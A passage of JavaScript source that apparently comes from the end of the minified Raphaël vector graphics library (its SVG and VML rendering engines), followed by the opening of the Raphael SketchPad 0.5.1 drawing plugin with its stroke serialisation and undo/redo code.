this.paper.customAttributes)if(this.paper.customAttributes[b](n)&&m[b](n)&&a.is(this.paper.customAttributes[n],"function")){var o=this.paper.customAttributes[n].apply(this,[].concat(m[n]));this.attrs[n]=m[n];for(var p in o)o[b](p)&&(m[p]=o[p])}w(this,m);return this},A.toFront=function(){if(this.removed)return this;this.node.parentNode.tagName.toLowerCase()=="a"?this.node.parentNode.parentNode.appendChild(this.node.parentNode):this.node.parentNode.appendChild(this.node);var b=this.paper;b.top!=this&&a._tofront(this,b);return this},A.toBack=function(){if(this.removed)return this;var b=this.node.parentNode;b.tagName.toLowerCase()=="a"?b.parentNode.insertBefore(this.node.parentNode,this.node.parentNode.parentNode.firstChild):b.firstChild!=this.node&&b.insertBefore(this.node,this.node.parentNode.firstChild),a._toback(this,this.paper);var c=this.paper;return this},A.insertAfter=function(b){if(this.removed)return this;var c=b.node||b[b.length-1].node;c.nextSibling?c.parentNode.insertBefore(this.node,c.nextSibling):c.parentNode.appendChild(this.node),a._insertafter(this,b,this.paper);return this},A.insertBefore=function(b){if(this.removed)return this;var c=b.node||b[0].node;c.parentNode.insertBefore(this.node,c),a._insertbefore(this,b,this.paper);return this},A.blur=function(b){var c=this;if(+b!==0){var d=q("filter"),e=q("feGaussianBlur");c.attrs.blur=b,d.id=a.createUUID(),q(e,{stdDeviation:+b||1.5}),d.appendChild(e),c.paper.defs.appendChild(d),c._blur=d,q(c.node,{filter:"url(#"+d.id+")"})}else c._blur&&(c._blur.parentNode.removeChild(c._blur),delete c._blur,delete c.attrs.blur),c.node.removeAttribute("filter")},a._engine.circle=function(a,b,c,d){var e=q("circle");a.canvas&&a.canvas.appendChild(e);var f=new z(e,a);f.attrs={cx:b,cy:c,r:d,fill:"none",stroke:"#000"},f.type="circle",q(e,f.attrs);return f},a._engine.rect=function(a,b,c,d,e,f){var g=q("rect");a.canvas&&a.canvas.appendChild(g);var h=new z(g,a);h.attrs={x:b,y:c,width:d,height:e,r:f||0,rx:f||0,ry:f||0,fill:"none",stroke:"#000"},h.type="rect",q(g,h.attrs);return h},a._engine.ellipse=function(a,b,c,d,e){var f=q("ellipse");a.canvas&&a.canvas.appendChild(f);var g=new z(f,a);g.attrs={cx:b,cy:c,rx:d,ry:e,fill:"none",stroke:"#000"},g.type="ellipse",q(f,g.attrs);return g},a._engine.image=function(a,b,c,d,e,f){var g=q("image");q(g,{x:c,y:d,width:e,height:f,preserveAspectRatio:"none"}),g.setAttributeNS(n,"href",b),a.canvas&&a.canvas.appendChild(g);var h=new z(g,a);h.attrs={x:c,y:d,width:e,height:f,src:b},h.type="image";return h},a._engine.text=function(b,c,d,e){var f=q("text");b.canvas&&b.canvas.appendChild(f);var g=new z(f,b);g.attrs={x:c,y:d,"text-anchor":"middle",text:e,font:a._availableAttrs.font,stroke:"none",fill:"#000"},g.type="text",w(g,g.attrs);return g},a._engine.setSize=function(a,b){this.width=a||this.width,this.height=b||this.height,this.canvas.setAttribute("width",this.width),this.canvas.setAttribute("height",this.height),this._viewBox&&this.setViewBox.apply(this,this._viewBox);return this},a._engine.create=function(){var b=a._getContainer.apply(0,arguments),c=b&&b.container,d=b.x,e=b.y,f=b.width,g=b.height;if(!c)throw new Error("SVG container not found.");var h=q("svg"),i="overflow:hidden;",j;d=d||0,e=e||0,f=f||512,g=g||342,q(h,{height:g,version:1.1,width:f,xmlns:"http://www.w3.org/2000/svg"}),c==1?(h.style.cssText=i+"position:absolute;left:"+d+"px;top:"+e+"px",a._g.doc.body.appendChild(h),j=1):(h.style.cssText=i+"position:relative",c.firstChild?c.insertBefore(h,c.firstChild):c.appendChild(h)),c=new a._Paper,c.width=f,c.height=g,c.canvas=h,c.clear(),c._left=c._top=0,j&&(c.renderfix=function(){}),c.renderfix();return c},a._engine.setViewBox=function(a,b,c,d,e){k("raphael.setViewBox",this,this._viewBox,[a,b,c,d,e]);var f=g(c/this.width,d/this.height),h=this.top,i=e?"meet":"xMinYMin",j,l;a==null?(this._vbSize&&(f=1),delete this._vbSize,j="0 0 "+this.width+m+this.height):(this._vbSize=f,j=a+m+b+m+c+m+d),q(this.canvas,{viewBox:j,preserveAspectRatio:i});while(f&&h)l="stroke-width"in h.attrs?h.attrs["stroke-width"]:1,h.attr({"stroke-width":l}),h._.dirty=1,h._.dirtyT=1,h=h.prev;this._viewBox=[a,b,c,d,!!e];return this},a.prototype.renderfix=function(){var a=this.canvas,b=a.style,c;try{c=a.getScreenCTM()||a.createSVGMatrix()}catch(d){c=a.createSVGMatrix()}var e=-c.e%1,f=-c.f%1;if(e||f)e&&(this._left=(this._left+e)%1,b.left=this._left+"px"),f&&(this._top=(this._top+f)%1,b.top=this._top+"px")},a.prototype.clear=function(){a.eve("raphael.clear",this);var b=this.canvas;while(b.firstChild)b.removeChild(b.firstChild);this.bottom=this.top=null,(this.desc=q("desc")).appendChild(a._g.doc.createTextNode("Created with Raphaël "+a.version)),b.appendChild(this.desc),b.appendChild(this.defs=q("defs"))},a.prototype.remove=function(){k("raphael.remove",this),this.canvas.parentNode&&this.canvas.parentNode.removeChild(this.canvas);for(var b in this)this[b]=typeof this[b]=="function"?a._removedFactory(b):null};var B=a.st;for(var C in A)A[b](C)&&!B[b](C)&&(B[C]=function(a){return function(){var b=arguments;return this.forEach(function(c){c[a].apply(c,b)})}}(C))}(window.Raphael),window.Raphael.vml&&function(a){var b="hasOwnProperty",c=String,d=parseFloat,e=Math,f=e.round,g=e.max,h=e.min,i=e.abs,j="fill",k=/[, ]+/,l=a.eve,m=" progid:DXImageTransform.Microsoft",n=" ",o="",p={M:"m",L:"l",C:"c",Z:"x",m:"t",l:"r",c:"v",z:"x"},q=/([clmz]),?([^clmz]*)/gi,r=/ progid:\S+Blur\([^\)]+\)/g,s=/-?[^,\s-]+/g,t="position:absolute;left:0;top:0;width:1px;height:1px",u=21600,v={path:1,rect:1,image:1},w={circle:1,ellipse:1},x=function(b){var d=/[ahqstv]/ig,e=a._pathToAbsolute;c(b).match(d)&&(e=a._path2curve),d=/[clmz]/g;if(e==a._pathToAbsolute&&!c(b).match(d)){var g=c(b).replace(q,function(a,b,c){var d=[],e=b.toLowerCase()=="m",g=p[b];c.replace(s,function(a){e&&d.length==2&&(g+=d+p[b=="m"?"l":"L"],d=[]),d.push(f(a*u))});return g+d});return g}var h=e(b),i,j;g=[];for(var k=0,l=h.length;k<l;k++){i=h[k],j=h[k][0].toLowerCase(),j=="z"&&(j="x");for(var m=1,r=i.length;m<r;m++)j+=f(i[m]*u)+(m!=r-1?",":o);g.push(j)}return g.join(n)},y=function(b,c,d){var e=a.matrix();e.rotate(-b,.5,.5);return{dx:e.x(c,d),dy:e.y(c,d)}},z=function(a,b,c,d,e,f){var g=a._,h=a.matrix,k=g.fillpos,l=a.node,m=l.style,o=1,p="",q,r=u/b,s=u/c;m.visibility="hidden";if(!!b&&!!c){l.coordsize=i(r)+n+i(s),m.rotation=f*(b*c<0?-1:1);if(f){var t=y(f,d,e);d=t.dx,e=t.dy}b<0&&(p+="x"),c<0&&(p+=" y")&&(o=-1),m.flip=p,l.coordorigin=d*-r+n+e*-s;if(k||g.fillsize){var v=l.getElementsByTagName(j);v=v&&v[0],l.removeChild(v),k&&(t=y(f,h.x(k[0],k[1]),h.y(k[0],k[1])),v.position=t.dx*o+n+t.dy*o),g.fillsize&&(v.size=g.fillsize[0]*i(b)+n+g.fillsize[1]*i(c)),l.appendChild(v)}m.visibility="visible"}};a.toString=function(){return"Your browser doesn’t support SVG. Falling down to VML.\nYou are running Raphaël "+this.version};var A=function(a,b,d){var e=c(b).toLowerCase().split("-"),f=d?"end":"start",g=e.length,h="classic",i="medium",j="medium";while(g--)switch(e[g]){case"block":case"classic":case"oval":case"diamond":case"open":case"none":h=e[g];break;case"wide":case"narrow":j=e[g];break;case"long":case"short":i=e[g]}var k=a.node.getElementsByTagName("stroke")[0];k[f+"arrow"]=h,k[f+"arrowlength"]=i,k[f+"arrowwidth"]=j},B=function(e,i){e.attrs=e.attrs||{};var l=e.node,m=e.attrs,p=l.style,q,r=v[e.type]&&(i.x!=m.x||i.y!=m.y||i.width!=m.width||i.height!=m.height||i.cx!=m.cx||i.cy!=m.cy||i.rx!=m.rx||i.ry!=m.ry||i.r!=m.r),s=w[e.type]&&(m.cx!=i.cx||m.cy!=i.cy||m.r!=i.r||m.rx!=i.rx||m.ry!=i.ry),t=e;for(var y in i)i[b](y)&&(m[y]=i[y]);r&&(m.path=a._getPath[e.type](e),e._.dirty=1),i.href&&(l.href=i.href),i.title&&(l.title=i.title),i.target&&(l.target=i.target),i.cursor&&(p.cursor=i.cursor),"blur"in i&&e.blur(i.blur);if(i.path&&e.type=="path"||r)l.path=x(~c(m.path).toLowerCase().indexOf("r")?a._pathToAbsolute(m.path):m.path),e.type=="image"&&(e._.fillpos=[m.x,m.y],e._.fillsize=[m.width,m.height],z(e,1,1,0,0,0));"transform"in i&&e.transform(i.transform);if(s){var B=+m.cx,D=+m.cy,E=+m.rx||+m.r||0,G=+m.ry||+m.r||0;l.path=a.format("ar{0},{1},{2},{3},{4},{1},{4},{1}x",f((B-E)*u),f((D-G)*u),f((B+E)*u),f((D+G)*u),f(B*u))}if("clip-rect"in i){var H=c(i["clip-rect"]).split(k);if(H.length==4){H[2]=+H[2]+ +H[0],H[3]=+H[3]+ +H[1];var I=l.clipRect||a._g.doc.createElement("div"),J=I.style;J.clip=a.format("rect({1}px {2}px {3}px {0}px)",H),l.clipRect||(J.position="absolute",J.top=0,J.left=0,J.width=e.paper.width+"px",J.height=e.paper.height+"px",l.parentNode.insertBefore(I,l),I.appendChild(l),l.clipRect=I)}i["clip-rect"]||l.clipRect&&(l.clipRect.style.clip="auto")}if(e.textpath){var K=e.textpath.style;i.font&&(K.font=i.font),i["font-family"]&&(K.fontFamily='"'+i["font-family"].split(",")[0].replace(/^['"]+|['"]+$/g,o)+'"'),i["font-size"]&&(K.fontSize=i["font-size"]),i["font-weight"]&&(K.fontWeight=i["font-weight"]),i["font-style"]&&(K.fontStyle=i["font-style"])}"arrow-start"in i&&A(t,i["arrow-start"]),"arrow-end"in i&&A(t,i["arrow-end"],1);if(i.opacity!=null||i["stroke-width"]!=null||i.fill!=null||i.src!=null||i.stroke!=null||i["stroke-width"]!=null||i["stroke-opacity"]!=null||i["fill-opacity"]!=null||i["stroke-dasharray"]!=null||i["stroke-miterlimit"]!=null||i["stroke-linejoin"]!=null||i["stroke-linecap"]!=null){var L=l.getElementsByTagName(j),M=!1;L=L&&L[0],!L&&(M=L=F(j)),e.type=="image"&&i.src&&(L.src=i.src),i.fill&&(L.on=!0);if(L.on==null||i.fill=="none"||i.fill===null)L.on=!1;if(L.on&&i.fill){var N=c(i.fill).match(a._ISURL);if(N){L.parentNode==l&&l.removeChild(L),L.rotate=!0,L.src=N[1],L.type="tile";var O=e.getBBox(1);L.position=O.x+n+O.y,e._.fillpos=[O.x,O.y],a._preload(N[1],function(){e._.fillsize=[this.offsetWidth,this.offsetHeight]})}else L.color=a.getRGB(i.fill).hex,L.src=o,L.type="solid",a.getRGB(i.fill).error&&(t.type in{circle:1,ellipse:1}||c(i.fill).charAt()!="r")&&C(t,i.fill,L)&&(m.fill="none",m.gradient=i.fill,L.rotate=!1)}if("fill-opacity"in i||"opacity"in i){var P=((+m["fill-opacity"]+1||2)-1)*((+m.opacity+1||2)-1)*((+a.getRGB(i.fill).o+1||2)-1);P=h(g(P,0),1),L.opacity=P,L.src&&(L.color="none")}l.appendChild(L);var Q=l.getElementsByTagName("stroke")&&l.getElementsByTagName("stroke")[0],T=!1;!Q&&(T=Q=F("stroke"));if(i.stroke&&i.stroke!="none"||i["stroke-width"]||i["stroke-opacity"]!=null||i["stroke-dasharray"]||i["stroke-miterlimit"]||i["stroke-linejoin"]||i["stroke-linecap"])Q.on=!0;(i.stroke=="none"||i.stroke===null||Q.on==null||i.stroke==0||i["stroke-width"]==0)&&(Q.on=!1);var U=a.getRGB(i.stroke);Q.on&&i.stroke&&(Q.color=U.hex),P=((+m["stroke-opacity"]+1||2)-1)*((+m.opacity+1||2)-1)*((+U.o+1||2)-1);var V=(d(i["stroke-width"])||1)*.75;P=h(g(P,0),1),i["stroke-width"]==null&&(V=m["stroke-width"]),i["stroke-width"]&&(Q.weight=V),V&&V<1&&(P*=V)&&(Q.weight=1),Q.opacity=P,i["stroke-linejoin"]&&(Q.joinstyle=i["stroke-linejoin"]||"miter"),Q.miterlimit=i["stroke-miterlimit"]||8,i["stroke-linecap"]&&(Q.endcap=i["stroke-linecap"]=="butt"?"flat":i["stroke-linecap"]=="square"?"square":"round");if(i["stroke-dasharray"]){var W={"-":"shortdash",".":"shortdot","-.":"shortdashdot","-..":"shortdashdotdot",". ":"dot","- ":"dash","--":"longdash","- .":"dashdot","--.":"longdashdot","--..":"longdashdotdot"};Q.dashstyle=W[b](i["stroke-dasharray"])?W[i["stroke-dasharray"]]:o}T&&l.appendChild(Q)}if(t.type=="text"){t.paper.canvas.style.display=o;var X=t.paper.span,Y=100,Z=m.font&&m.font.match(/\d+(?:\.\d*)?(?=px)/);p=X.style,m.font&&(p.font=m.font),m["font-family"]&&(p.fontFamily=m["font-family"]),m["font-weight"]&&(p.fontWeight=m["font-weight"]),m["font-style"]&&(p.fontStyle=m["font-style"]),Z=d(m["font-size"]||Z&&Z[0])||10,p.fontSize=Z*Y+"px",t.textpath.string&&(X.innerHTML=c(t.textpath.string).replace(/</g,"&#60;").replace(/&/g,"&#38;").replace(/\n/g,"<br>"));var $=X.getBoundingClientRect();t.W=m.w=($.right-$.left)/Y,t.H=m.h=($.bottom-$.top)/Y,t.X=m.x,t.Y=m.y+t.H/2,("x"in i||"y"in i)&&(t.path.v=a.format("m{0},{1}l{2},{1}",f(m.x*u),f(m.y*u),f(m.x*u)+1));var _=["x","y","text","font","font-family","font-weight","font-style","font-size"];for(var ba=0,bb=_.length;ba<bb;ba++)if(_[ba]in i){t._.dirty=1;break}switch(m["text-anchor"]){case"start":t.textpath.style["v-text-align"]="left",t.bbx=t.W/2;break;case"end":t.textpath.style["v-text-align"]="right",t.bbx=-t.W/2;break;default:t.textpath.style["v-text-align"]="center",t.bbx=0}t.textpath.style["v-text-kern"]=!0}},C=function(b,f,g){b.attrs=b.attrs||{};var h=b.attrs,i=Math.pow,j,k,l="linear",m=".5 .5";b.attrs.gradient=f,f=c(f).replace(a._radial_gradient,function(a,b,c){l="radial",b&&c&&(b=d(b),c=d(c),i(b-.5,2)+i(c-.5,2)>.25&&(c=e.sqrt(.25-i(b-.5,2))*((c>.5)*2-1)+.5),m=b+n+c);return o}),f=f.split(/\s*\-\s*/);if(l=="linear"){var p=f.shift();p=-d(p);if(isNaN(p))return null}var q=a._parseDots(f);if(!q)return null;b=b.shape||b.node;if(q.length){b.removeChild(g),g.on=!0,g.method="none",g.color=q[0].color,g.color2=q[q.length-1].color;var r=[];for(var s=0,t=q.length;s<t;s++)q[s].offset&&r.push(q[s].offset+n+q[s].color);g.colors=r.length?r.join():"0% "+g.color,l=="radial"?(g.type="gradientTitle",g.focus="100%",g.focussize="0 0",g.focusposition=m,g.angle=0):(g.type="gradient",g.angle=(270-p)%360),b.appendChild(g)}return 1},D=function(b,c){this[0]=this.node=b,b.raphael=!0,this.id=a._oid++,b.raphaelid=this.id,this.X=0,this.Y=0,this.attrs={},this.paper=c,this.matrix=a.matrix(),this._={transform:[],sx:1,sy:1,dx:0,dy:0,deg:0,dirty:1,dirtyT:1},!c.bottom&&(c.bottom=this),this.prev=c.top,c.top&&(c.top.next=this),c.top=this,this.next=null},E=a.el;D.prototype=E,E.constructor=D,E.transform=function(b){if(b==null)return this._.transform;var d=this.paper._viewBoxShift,e=d?"s"+[d.scale,d.scale]+"-1-1t"+[d.dx,d.dy]:o,f;d&&(f=b=c(b).replace(/\.{3}|\u2026/g,this._.transform||o)),a._extractTransform(this,e+b);var g=this.matrix.clone(),h=this.skew,i=this.node,j,k=~c(this.attrs.fill).indexOf("-"),l=!c(this.attrs.fill).indexOf("url(");g.translate(-0.5,-0.5);if(l||k||this.type=="image"){h.matrix="1 0 0 1",h.offset="0 0",j=g.split();if(k&&j.noRotation||!j.isSimple){i.style.filter=g.toFilter();var m=this.getBBox(),p=this.getBBox(1),q=m.x-p.x,r=m.y-p.y;i.coordorigin=q*-u+n+r*-u,z(this,1,1,q,r,0)}else i.style.filter=o,z(this,j.scalex,j.scaley,j.dx,j.dy,j.rotate)}else i.style.filter=o,h.matrix=c(g),h.offset=g.offset();f&&(this._.transform=f);return this},E.rotate=function(a,b,e){if(this.removed)return this;if(a!=null){a=c(a).split(k),a.length-1&&(b=d(a[1]),e=d(a[2])),a=d(a[0]),e==null&&(b=e);if(b==null||e==null){var f=this.getBBox(1);b=f.x+f.width/2,e=f.y+f.height/2}this._.dirtyT=1,this.transform(this._.transform.concat([["r",a,b,e]]));return this}},E.translate=function(a,b){if(this.removed)return this;a=c(a).split(k),a.length-1&&(b=d(a[1])),a=d(a[0])||0,b=+b||0,this._.bbox&&(this._.bbox.x+=a,this._.bbox.y+=b),this.transform(this._.transform.concat([["t",a,b]]));return this},E.scale=function(a,b,e,f){if(this.removed)return this;a=c(a).split(k),a.length-1&&(b=d(a[1]),e=d(a[2]),f=d(a[3]),isNaN(e)&&(e=null),isNaN(f)&&(f=null)),a=d(a[0]),b==null&&(b=a),f==null&&(e=f);if(e==null||f==null)var g=this.getBBox(1);e=e==null?g.x+g.width/2:e,f=f==null?g.y+g.height/2:f,this.transform(this._.transform.concat([["s",a,b,e,f]])),this._.dirtyT=1;return this},E.hide=function(){!this.removed&&(this.node.style.display="none");return this},E.show=function(){!this.removed&&(this.node.style.display=o);return this},E._getBBox=function(){if(this.removed)return{};return{x:this.X+(this.bbx||0)-this.W/2,y:this.Y-this.H,width:this.W,height:this.H}},E.remove=function(){if(!this.removed&&!!this.node.parentNode){this.paper.__set__&&this.paper.__set__.exclude(this),a.eve.unbind("raphael.*.*."+this.id),a._tear(this,this.paper),this.node.parentNode.removeChild(this.node),this.shape&&this.shape.parentNode.removeChild(this.shape);for(var b in this)this[b]=typeof this[b]=="function"?a._removedFactory(b):null;this.removed=!0}},E.attr=function(c,d){if(this.removed)return this;if(c==null){var e={};for(var f in this.attrs)this.attrs[b](f)&&(e[f]=this.attrs[f]);e.gradient&&e.fill=="none"&&(e.fill=e.gradient)&&delete e.gradient,e.transform=this._.transform;return e}if(d==null&&a.is(c,"string")){if(c==j&&this.attrs.fill=="none"&&this.attrs.gradient)return this.attrs.gradient;var g=c.split(k),h={};for(var i=0,m=g.length;i<m;i++)c=g[i],c in this.attrs?h[c]=this.attrs[c]:a.is(this.paper.customAttributes[c],"function")?h[c]=this.paper.customAttributes[c].def:h[c]=a._availableAttrs[c];return m-1?h:h[g[0]]}if(this.attrs&&d==null&&a.is(c,"array")){h={};for(i=0,m=c.length;i<m;i++)h[c[i]]=this.attr(c[i]);return h}var n;d!=null&&(n={},n[c]=d),d==null&&a.is(c,"object")&&(n=c);for(var o in n)l("raphael.attr."+o+"."+this.id,this,n[o]);if(n){for(o in this.paper.customAttributes)if(this.paper.customAttributes[b](o)&&n[b](o)&&a.is(this.paper.customAttributes[o],"function")){var p=this.paper.customAttributes[o].apply(this,[].concat(n[o]));this.attrs[o]=n[o];for(var q in p)p[b](q)&&(n[q]=p[q])}n.text&&this.type=="text"&&(this.textpath.string=n.text),B(this,n)}return this},E.toFront=function(){!this.removed&&this.node.parentNode.appendChild(this.node),this.paper&&this.paper.top!=this&&a._tofront(this,this.paper);return this},E.toBack=function(){if(this.removed)return this;this.node.parentNode.firstChild!=this.node&&(this.node.parentNode.insertBefore(this.node,this.node.parentNode.firstChild),a._toback(this,this.paper));return this},E.insertAfter=function(b){if(this.removed)return this;b.constructor==a.st.constructor&&(b=b[b.length-1]),b.node.nextSibling?b.node.parentNode.insertBefore(this.node,b.node.nextSibling):b.node.parentNode.appendChild(this.node),a._insertafter(this,b,this.paper);return this},E.insertBefore=function(b){if(this.removed)return this;b.constructor==a.st.constructor&&(b=b[0]),b.node.parentNode.insertBefore(this.node,b.node),a._insertbefore(this,b,this.paper);return this},E.blur=function(b){var c=this.node.runtimeStyle,d=c.filter;d=d.replace(r,o),+b!==0?(this.attrs.blur=b,c.filter=d+n+m+".Blur(pixelradius="+(+b||1.5)+")",c.margin=a.format("-{0}px 0 0 -{0}px",f(+b||1.5))):(c.filter=d,c.margin=0,delete this.attrs.blur)},a._engine.path=function(a,b){var c=F("shape");c.style.cssText=t,c.coordsize=u+n+u,c.coordorigin=b.coordorigin;var d=new D(c,b),e={fill:"none",stroke:"#000"};a&&(e.path=a),d.type="path",d.path=[],d.Path=o,B(d,e),b.canvas.appendChild(c);var f=F("skew");f.on=!0,c.appendChild(f),d.skew=f,d.transform(o);return d},a._engine.rect=function(b,c,d,e,f,g){var h=a._rectPath(c,d,e,f,g),i=b.path(h),j=i.attrs;i.X=j.x=c,i.Y=j.y=d,i.W=j.width=e,i.H=j.height=f,j.r=g,j.path=h,i.type="rect";return i},a._engine.ellipse=function(a,b,c,d,e){var f=a.path(),g=f.attrs;f.X=b-d,f.Y=c-e,f.W=d*2,f.H=e*2,f.type="ellipse",B(f,{cx:b,cy:c,rx:d,ry:e});return f},a._engine.circle=function(a,b,c,d){var e=a.path(),f=e.attrs;e.X=b-d,e.Y=c-d,e.W=e.H=d*2,e.type="circle",B(e,{cx:b,cy:c,r:d});return e},a._engine.image=function(b,c,d,e,f,g){var h=a._rectPath(d,e,f,g),i=b.path(h).attr({stroke:"none"}),k=i.attrs,l=i.node,m=l.getElementsByTagName(j)[0];k.src=c,i.X=k.x=d,i.Y=k.y=e,i.W=k.width=f,i.H=k.height=g,k.path=h,i.type="image",m.parentNode==l&&l.removeChild(m),m.rotate=!0,m.src=c,m.type="tile",i._.fillpos=[d,e],i._.fillsize=[f,g],l.appendChild(m),z(i,1,1,0,0,0);return i},a._engine.text=function(b,d,e,g){var h=F("shape"),i=F("path"),j=F("textpath");d=d||0,e=e||0,g=g||"",i.v=a.format("m{0},{1}l{2},{1}",f(d*u),f(e*u),f(d*u)+1),i.textpathok=!0,j.string=c(g),j.on=!0,h.style.cssText=t,h.coordsize=u+n+u,h.coordorigin="0 0";var k=new D(h,b),l={fill:"#000",stroke:"none",font:a._availableAttrs.font,text:g};k.shape=h,k.path=i,k.textpath=j,k.type="text",k.attrs.text=c(g),k.attrs.x=d,k.attrs.y=e,k.attrs.w=1,k.attrs.h=1,B(k,l),h.appendChild(j),h.appendChild(i),b.canvas.appendChild(h);var m=F("skew");m.on=!0,h.appendChild(m),k.skew=m,k.transform(o);return k},a._engine.setSize=function(b,c){var d=this.canvas.style;this.width=b,this.height=c,b==+b&&(b+="px"),c==+c&&(c+="px"),d.width=b,d.height=c,d.clip="rect(0 "+b+" "+c+" 0)",this._viewBox&&a._engine.setViewBox.apply(this,this._viewBox);return this},a._engine.setViewBox=function(b,c,d,e,f){a.eve("raphael.setViewBox",this,this._viewBox,[b,c,d,e,f]);var h=this.width,i=this.height,j=1/g(d/h,e/i),k,l;f&&(k=i/e,l=h/d,d*k<h&&(b-=(h-d*k)/2/k),e*l<i&&(c-=(i-e*l)/2/l)),this._viewBox=[b,c,d,e,!!f],this._viewBoxShift={dx:-b,dy:-c,scale:j},this.forEach(function(a){a.transform("...")});return this};var F;a._engine.initWin=function(a){var b=a.document;b.createStyleSheet().addRule(".rvml","behavior:url(#default#VML)");try{!b.namespaces.rvml&&b.namespaces.add("rvml","urn:schemas-microsoft-com:vml"),F=function(a){return b.createElement("<rvml:"+a+' class="rvml">')}}catch(c){F=function(a){return b.createElement("<"+a+' xmlns="urn:schemas-microsoft.com:vml" class="rvml">')}}},a._engine.initWin(a._g.win),a._engine.create=function(){var b=a._getContainer.apply(0,arguments),c=b.container,d=b.height,e,f=b.width,g=b.x,h=b.y;if(!c)throw new Error("VML container not found.");var i=new a._Paper,j=i.canvas=a._g.doc.createElement("div"),k=j.style;g=g||0,h=h||0,f=f||512,d=d||342,i.width=f,i.height=d,f==+f&&(f+="px"),d==+d&&(d+="px"),i.coordsize=u*1e3+n+u*1e3,i.coordorigin="0 0",i.span=a._g.doc.createElement("span"),i.span.style.cssText="position:absolute;left:-9999em;top:-9999em;padding:0;margin:0;line-height:1;",j.appendChild(i.span),k.cssText=a.format("top:0;left:0;width:{0};height:{1};display:inline-block;position:relative;clip:rect(0 {0} {1} 0);overflow:hidden",f,d),c==1?(a._g.doc.body.appendChild(j),k.left=g+"px",k.top=h+"px",k.position="absolute"):c.firstChild?c.insertBefore(j,c.firstChild):c.appendChild(j),i.renderfix=function(){};return i},a.prototype.clear=function(){a.eve("raphael.clear",this),this.canvas.innerHTML=o,this.span=a._g.doc.createElement("span"),this.span.style.cssText="position:absolute;left:-9999em;top:-9999em;padding:0;margin:0;line-height:1;display:inline;",this.canvas.appendChild(this.span),this.bottom=this.top=null},a.prototype.remove=function(){a.eve("raphael.remove",this),this.canvas.parentNode.removeChild(this.canvas);for(var b in this)this[b]=typeof this[b]=="function"?a._removedFactory(b):null;return!0};var G=a.st;for(var H in E)E[b](H)&&!G[b](H)&&(G[H]=function(a){return function(){var b=arguments;return this.forEach(function(c){c[a].apply(c,b)})}}(H))}(window.Raphael)




/*
 * Raphael SketchPad
 * Version 0.5.1
 * Copyright (c) 2011 Ian Li (http://ianli.com)
 * Licensed under the MIT (http://www.opensource.org/licenses/mit-license.php) license.
 *
 * Requires:
 * jQuery	http://jquery.com
 * Raphael	http://raphaeljs.com
 * JSON		http://www.json.org/js.html
 *
 * Reference:
 * http://ianli.com/sketchpad/ for Usage
 *
 * Versions:
 * 0.5.1 - Fixed extraneous lines when first line is drawn.
 *         Thanks to http://github.com/peterkeating for the fix!
 * 0.5.0 - Added freeze_history. Fixed bug with undoing erase actions.
 * 0.4.0 - Support undo/redo of strokes, erase, and clear.
 *       - Removed input option. To make editors/viewers, set editing option to true/false, respectively.
 *         To update an input field, listen to change event and update input field with json function.
 *       - Reduce file size V1. Changed stored path info from array into a string in SVG format.
 * 0.3.0 - Added erase, supported initializing data from input field.
 * 0.2.0 - Added iPhone/iPod Touch support, onchange event, animate.
 * 0.1.0 - Started code.
 *
 * TODO:
 * - Speed up performance.
 *   - Don't store strokes in two places. _strokes and ActionHistory.current_strokes()
 *	 - Don't rebuild strokes from history with ActionHistory.current_strokes()
 * - Reduce file size.
 *   X V1. Changed stored path info from array into a string in SVG format.
 */

/**
 * We use this wrapper to control global variables.
 * The only global variable we expose is Raphael.sketchpad.
 */
(function(Raphael) {

	/**
	 * Function to create SketchPad object.
	 */
	Raphael.sketchpad = function(paper, options) {
		return new SketchPad(paper, options);
	}

	// Current version.
	Raphael.sketchpad.VERSION = '0.5.1';

	/**
	 * The Sketchpad object.
	 */
	var SketchPad = function(paper, options) {
		// Use self to reduce confusion about this.
		var self = this;

		var _options = {
			width: 100,
			height: 100,
			strokes: [],
			editing: true
		};
		jQuery.extend(_options, options);


		// The Raphael context to draw on.
		var _paper;
		if (paper.raphael && paper.raphael.constructor == Raphael.constructor) {
			_paper = paper;
		} else if (typeof paper == "string") {
			_paper = Raphael(paper, _options.width, _options.height);
		} else {
			throw "first argument must be a Raphael object, an element ID, an array with 3 elements";
		}

		// The Raphael SVG canvas.
		var _canvas = _paper.canvas;

		// The HTML element that contains the canvas.
		var _container = $(_canvas).parent();

		// The default pen.
		var _pen = new Pen();


		// Public Methods
		//-----------------

		self.paper = function() {
			return _paper;
		};

		self.canvas = function() {
			return _canvas;
		};

		self.container = function() {
			return _container;
		};

		self.pen = function(value) {
			if (value === undefined) {
				return _pen;
			}
			_pen = value;
			return self; // function-chaining
		};

		// Convert an SVG path into a string, so that it's smaller when JSONified.
		// This function is used by json().
		function svg_path_to_string(path) {
			var str = "";
			for (var i = 0, n = path.length; i < n; i++) {
				var point = path[i];
				str += point[0] + point[1] + "," + point[2];
			}
			return str;
		}

		// Convert a string into an SVG path. This reverses the above code.
		function string_to_svg_path(str) {
			var path = [];
			var tokens = str.split("L");

			if (tokens.length > 0) {
				var token = tokens[0].replace("M", "");
				var points = token.split(",");
				path.push(["M", parseInt(points[0]), parseInt(points[1])]);

				for (var i = 1, n = tokens.length; i < n; i++) {
					token = tokens[i];
					points = token.split(",");
					path.push(["L", parseInt(points[0]), parseInt(points[1])]);
				}
			}

			return path;
		}

		self.json = function(value) {
			if (value === undefined) {
				for (var i = 0, n = _strokes.length; i < n; i++) {
					var stroke = _strokes[i];
					if (typeof stroke.path == "object") {
						stroke.path = svg_path_to_string(stroke.path);
					}
				}
				return JSON.stringify(_strokes);
			}

			return self.strokes(JSON.parse(value));
		};

		self.strokes = function(value) {
			if (value === undefined) {
				return _strokes;
			}
			if (jQuery.isArray(value)) {
				_strokes = value;

				for (var i = 0, n = _strokes.length; i < n; i++) {
					var stroke = _strokes[i];
					if (typeof stroke.path == "string") {
						stroke.path = string_to_svg_path(stroke.path);
					}
				}

				_action_history.add({
					type: "batch",
					strokes: jQuery.merge([], _strokes) // Make a copy.
				})

				_redraw_strokes();
				_fire_change();
			}
			return self; // function-chaining
		}

		self.freeze_history = function() {
			_action_history.freeze();
		};

		self.undoable = function() {
			return _action_history.undoable();
		};

		self.undo = function() {
			if (_action_history.undoable()) {
				_action_history.undo();
				_strokes = _action_history.current_strokes();
				_redraw_strokes();
				_fire_change();
			}
			return self; // function-chaining
		};

		self.redoable = function() {
			return _action_history.redoable();
		};

		self.redo = function() {
			if (_action_history.redoable()) {
				_action_history.redo();
				_strokes = _action_history.current_strokes();
				_redraw_strokes();
				_fire_change();
			}
			return self; // function-chaining
		};

		self.clear = function() {
			_action_history.add({
				type: "clear"
			});

			_strokes = [];
			_redraw_strokes();
			_fire_change();

